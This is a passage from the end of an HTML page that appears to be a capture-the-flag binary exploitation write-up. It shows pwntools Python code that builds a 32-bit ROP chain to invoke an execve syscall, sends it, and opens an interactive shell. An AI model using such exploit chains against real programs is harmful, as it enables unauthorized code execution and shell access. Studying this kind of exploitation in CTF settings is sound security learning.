</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080481c9</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span>

<span class="c1"># set edx = 0 (NULL)
# pop edx; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0806ee6b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1"># set ecx = 0 and perform syscall
# xor ecx, ecx; int 0x80
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0806f231</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>




  <small>tags: <em>binary exploitation</em> - <em>ctf</em></small>


      </section>
    </div>

    
  </body>
</html>
